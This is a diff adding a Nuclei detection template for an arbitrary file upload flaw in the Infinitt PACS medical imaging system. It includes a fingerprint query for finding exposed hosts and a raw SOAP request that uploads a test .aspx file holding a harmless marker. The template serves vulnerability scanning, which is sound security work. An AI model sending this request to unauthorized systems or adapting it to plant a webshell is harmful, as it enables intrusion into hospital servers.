@@ -1,0 +1,57 @@
+id: infinitt-pacs-file-upload
+
+info:
+  name: Infinitt PACS System - Arbitary File Upload
+  author: adeljck
+  severity: critical
+  description: |
+    Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.
+  remediation: |
+    Ensure that file uploads are properly validated and sanitized. Implement strict access controls and monitoring to detect and prevent unauthorized file uploads.
+  reference:
+    - https://github.com/wy876/POC/blob/a9e4000fc76d0157b53ade916323b7b8256b17c3/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9FWebJobUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="1474455751" || icon_hash="702238928"
+  tags: infinitt,file-upload,intrusive,rce
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>{{filename}}.aspx</fileName>
+        <bufValue>MTIz</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<jobUploadResult>"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/xml"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100ff6057b0f976cefb29e40a336a4b2d60f9d4e243b61f7a348eeafd8d9598d4410220388e5bbb8ba5a937ec9e80c1b22db2e34909b3937842ebd1557b1dbc72d5a6c7:922c64590222798bb761d5b6d8e72950
